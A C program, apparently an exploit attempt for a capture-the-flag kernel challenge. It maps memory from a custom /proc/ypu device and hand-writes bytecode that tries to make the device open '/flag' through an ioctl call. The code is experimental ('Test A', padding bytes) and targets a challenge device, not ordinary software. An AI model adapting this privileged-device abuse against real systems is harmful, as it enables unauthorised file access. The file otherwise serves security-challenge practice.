#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>

int fd;
volatile char *shared_buffer;

void build_flag_exploit() {
    printf("\n=== Building Flag Exploit from Working Base ===\n");
    
    uint32_t magic = 0x595055;
    memset((void*)shared_buffer, 0, 0x100000);

    // Write "/flag" string to memory
    char *flag_path = (char*)(shared_buffer + 0x1000 + 0x50);
    strcpy(flag_path, "/flag");
    printf("Flag path written: '%s' at data offset 0x50\n", flag_path);

    uint32_t *header = (uint32_t*)shared_buffer;
    header[0] = magic;
    header[1] = 0x10;

    uint8_t *code = (uint8_t*)(shared_buffer + 0x10);
    
    printf("\n--- Test A: Working base + filename address ---\n");
    memset(code, 0, 0x100);
    int pc = 0;
    
    // Load filename address into A (0x50 points to "/flag")
    code[pc++] = 0x20;  // IMM A, 0x50
    code[pc++] = 0x00;
    code[pc++] = 0x50;
    
    code[pc++] = 0x20;  // IMM B, 0 (O_RDONLY)
    code[pc++] = 0x01;
    code[pc++] = 0x00;
    
    code[pc++] = 0x20;  // IMM C, 0 (mode)
    code[pc++] = 0x02;
    code[pc++] = 0x00;
    
    code[pc++] = 0x00; // some random padding
    code[pc++] = 0x00; // some random padding
    
    code[pc++] = 0x04;
    code[pc++] = 0x08;   
    code[pc++] = 0x20;
    
    
    code[pc++] = 0x04;
    code[pc++] = 0x20;
    code[pc++] = 0xff;
    
    
    printf("Instructions: Load /flag address, O_RDONLY, mode, then sys_open\n");
    errno = 0;
    int result = ioctl(fd, 0x539, 0);
    printf("Result: %d, errno: %d\n", result, errno);
    
    // Check if file was opened (look for fd in memory/registers)
    printf("Checking data area for any changes...\n");
    for (int i = 0x60; i < 0x80; i++) {
        uint8_t val = *((uint8_t*)(shared_buffer + 0x1000 + i));
        if (val != 0) {
            printf("Offset 0x%02x: 0x%02x\n", i, val);
        }
    }
    
    
    
}

int main() {
    printf("Y85 Flag Exploit Builder\n");
    printf("=======================\n");

    fd = open("/proc/ypu", O_RDWR);
    if (fd < 0) {
        perror("open /proc/ypu");
        return 1;
    }

    shared_buffer = mmap(NULL, 256 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (shared_buffer == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    printf("Mapped shared buffer at %p\n", shared_buffer);
    
    build_flag_exploit();

    munmap((void*)shared_buffer, 256 * 0x1000);
    close(fd);
    return 0;
}
